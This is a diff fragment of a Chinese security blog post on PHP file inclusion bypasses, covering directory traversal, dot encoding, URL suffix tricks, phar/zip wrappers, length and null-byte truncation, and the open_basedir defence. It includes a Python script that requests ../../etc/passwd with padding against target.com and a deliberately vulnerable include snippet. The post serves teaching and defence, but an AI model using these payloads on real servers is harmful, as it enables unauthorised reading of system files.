-<h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL格式在此处具有妙用，可以在payload最后加**<code>?</code>或者<code>#（url编码为%23）</code>，或者空格绕过%20**</p>
-<h4 id="使用协议"><a href="#使用协议" class="headerlink" title="使用协议"></a>使用协议</h4><p>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;都可以</p>
-<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件： php版本 &lt; php 5.2.8</p>
+<h2 id="绕过姿势"><a class="markdownIt-Anchor" href="#绕过姿势"></a> 绕过姿势</h2>
+<h3 id="指定前缀"><a class="markdownIt-Anchor" href="#指定前缀"></a> 指定前缀</h3>
+<h4 id="目录遍历"><a class="markdownIt-Anchor" href="#目录遍历"></a> 目录遍历</h4>
+<p><code>../</code>可以进行目录遍历</p>
+<h4 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h4>
+<p>有时把点号过滤了，尝试编码点号</p>
+<h3 id="指定后缀"><a class="markdownIt-Anchor" href="#指定后缀"></a> 指定后缀</h3>
+<h4 id="url"><a class="markdownIt-Anchor" href="#url"></a> URL</h4>
+<p>URL格式在此处具有妙用，可以在payload最后加**<code>?</code>或者<code>#（url编码为%23）</code>，或者空格绕过%20**</p>
+<h4 id="使用协议"><a class="markdownIt-Anchor" href="#使用协议"></a> 使用协议</h4>
+<p>phar://和zip://都可以</p>
+<h4 id="长度截断"><a class="markdownIt-Anchor" href="#长度截断"></a> 长度截断</h4>
+<p>利用条件： php版本 &lt; php 5.2.8</p>
 <p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
 <p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import requests<br><br># 目标 URL<br>url = &quot;http://target.com/index.php?file=&quot;<br><br># 目标文件<br>payload = &quot;../../../../../../etc/passwd&quot;<br><br># 生成超长路径（超过服务器限制）<br>long_truncation = payload + &quot;A&quot; * 4000  # 让路径超长<br><br># 发送请求<br>response = requests.get(url + long_truncation)<br><br># 检查是否成功<br>if &quot;root:&quot; in response.text:<br>    print(&quot;[+] 成功绕过，已读取 /etc/passwd&quot;)<br>    print(response.text)<br>else:<br>    print(&quot;[-] 失败，可能需要调整长度&quot;)<br><br></code></pre></td></tr></table></figure>
-
 <p><code>/etc/passwd</code> 文件包含 <code>root:</code> 关键字，如果返回 <code>root:x:0:0:</code> 说明读取成功</p>
-<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件： php版本 &lt; php 5.3.4</p>
+<h4 id="0字节截断"><a class="markdownIt-Anchor" href="#0字节截断"></a> 0字节截断</h4>
+<p>利用条件： php版本 &lt; php 5.3.4</p>
 <p><code>index.php?file=phpinfo.txt%00</code></p>
-<h3 id="指定前后缀"><a href="#指定前后缀" class="headerlink" title="指定前后缀"></a>指定前后缀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>    $file = $_GET[&#x27;file&#x27;];<br>    include &#x27;/var/www/html/&#x27;.$file.&#x27;/test/test.php&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure>
-
+<h3 id="指定前后缀"><a class="markdownIt-Anchor" href="#指定前后缀"></a> 指定前后缀</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>    $file = $_GET[&#x27;file&#x27;];<br>    include &#x27;/var/www/html/&#x27;.$file.&#x27;/test/test.php&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure>
 <p>可以使用目录遍历和长度截断（或者0字节截断），有必要的话可以对点号编码，至少协议和URL使用不了</p>
-<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><ul>
+<h2 id="防御方案"><a class="markdownIt-Anchor" href="#防御方案"></a> 防御方案</h2>
+<ul>
 <li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<code>open_basedir</code>，则会包含失败</li>
 </ul>
 <p><code>open_basedir</code> 的主要作用是限制 PHP 脚本只能访问指定的目录及其子目录。这样，即使某个脚本存在漏洞，也无法访问超出这些限定目录之外的文件</p>
@@ -391,14 +462,15 @@
 
 
 
-<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Hackun</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Hackun</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br />
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
 <div class="widgets">
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">PHP文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">相关函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-text">漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-Local-File-Inclusion"><span class="toc-text">LFI(Local File Inclusion)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RFI-Remote-File-Inclusion"><span class="toc-text">RFI(Remote File Inclusion)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text">测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8-etc-passwd%E6%9D%A5%E6%A3%80%E9%AA%8C%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-text">用&#x2F;etc&#x2F;passwd来检验漏洞存在</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text">路径遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-php-filter-%E8%BF%9B%E8%A1%8C-Base64-%E7%BC%96%E7%A0%81"><span class="toc-text">利用 php:&#x2F;&#x2F;filter 进行 Base64 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Null-Byte-%E6%88%AA%E6%96%AD%EF%BC%88PHP"><span class="toc-text">Null Byte 截断（PHP &lt;5.3.4）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH-INFO-%E6%88%AA%E6%96%AD"><span class="toc-text">PATH_INFO 截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%96%B9%E6%B3%95"><span class="toc-text">包含方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-text">作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text">使用实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http"><span class="toc-text">http:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-1"><span class="toc-text">作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B-1"><span class="toc-text">使用实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php"><span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81"><span class="toc-text">常见</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-2"><span class="toc-text">作用</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-4"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-3"><span class="toc-text">作用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E8%AF%AD%E5%8F%A5"><span class="toc-text">常用过滤语句</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8-%E6%9C%AA%E5%AE%8C"><span class="toc-text">常用过滤器(未完)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-1"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-5"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-2"><span class="toc-text">用法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#expect"><span class="toc-text">expect:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABsession"><span class="toc-text">包含session</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE%E9%80%89%E9%A1%B9"><span class="toc-text">一些配置选项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84php-session%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE"><span class="toc-text">常见的php-session存放位置</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97"><span class="toc-text">包含日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97"><span class="toc-text">访问日志</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E4%BD%8D%E7%BD%AE"><span class="toc-text">日志位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%8F%92%E5%85%A5"><span class="toc-text">payload插入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-log"><span class="toc-text">SSH log</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4"><span class="toc-text">利用条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABenviron%EF%BC%88%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%89"><span class="toc-text">包含environ（环境变量）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABfd"><span class="toc-text">包含fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">包含上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABpearcmd"><span class="toc-text">包含pearcmd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pearcmd-php-%E5%8F%AF%E8%83%BD%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-text">pearcmd.php 可能的路径</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows%EF%BC%88XAMPP%EF%BC%89"><span class="toc-text">Windows（XAMPP）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB-pearcmd-php-%E8%BF%9B%E8%A1%8C-RCE"><span class="toc-text">直接包含 pearcmd.php 进行 RCE</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E5%90%88-php-input-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">结合 php:&#x2F;&#x2F;input 进行代码执行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E5%90%88-session-auto-start-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">结合 session.auto_start 进行代码执行</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-text">绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80"><span class="toc-text">指定前缀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80"><span class="toc-text">指定后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">使用协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD"><span class="toc-text">0字节截断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E5%90%8E%E7%BC%80"><span class="toc-text">指定前后缀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-text">防御方案</span></a></li></ol></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text"> PHP文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text"> 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text"> 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text"> 相关函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-text"> 漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lfilocal-file-inclusion"><span class="toc-text"> LFI(Local File Inclusion)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rfiremote-file-inclusion"><span class="toc-text"> RFI(Remote File Inclusion)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text"> 测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8etcpasswd%E6%9D%A5%E6%A3%80%E9%AA%8C%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-text"> 用&#x2F;etc&#x2F;passwd来检验漏洞存在</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text"> 路径遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-phpfilter-%E8%BF%9B%E8%A1%8C-base64-%E7%BC%96%E7%A0%81"><span class="toc-text"> 利用 php:&#x2F;&#x2F;filter 进行 Base64 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null-byte-%E6%88%AA%E6%96%ADphp-534"><span class="toc-text"> Null Byte 截断（PHP &lt;5.3.4）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#path_info-%E6%88%AA%E6%96%AD"><span class="toc-text"> PATH_INFO 截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%96%B9%E6%B3%95"><span class="toc-text"> 包含方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text"> php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-text"> file:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-text"> 条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-text"> 作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text"> 使用实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http"><span class="toc-text"> http:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-2"><span class="toc-text"> 条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-2"><span class="toc-text"> 作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B-2"><span class="toc-text"> 使用实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php"><span class="toc-text"> php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81"><span class="toc-text"> 常见</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-3"><span class="toc-text"> 条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phpinput"><span class="toc-text"> php:&#x2F;&#x2F;input</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-4"><span class="toc-text"> 条件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-3"><span class="toc-text"> 作用</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phpfilter"><span class="toc-text"> php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-5"><span class="toc-text"> 条件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8-4"><span class="toc-text"> 作用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E8%AF%AD%E5%8F%A5"><span class="toc-text"> 常用过滤语句</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9C%AA%E5%AE%8C"><span class="toc-text"> 常用过滤器(未完)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar"><span class="toc-text"> phar:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text"> 用法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text"> 示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip"><span class="toc-text"> zip:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-2"><span class="toc-text"> 用法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-text"> 示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data"><span class="toc-text"> data:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-6"><span class="toc-text"> 条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-3"><span class="toc-text"> 用法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#expect"><span class="toc-text"> expect:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABsession"><span class="toc-text"> 包含session</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2"><span class="toc-text"> 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE%E9%80%89%E9%A1%B9"><span class="toc-text"> 一些配置选项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84php-session%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE"><span class="toc-text"> 常见的php-session存放位置</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text"> 利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97"><span 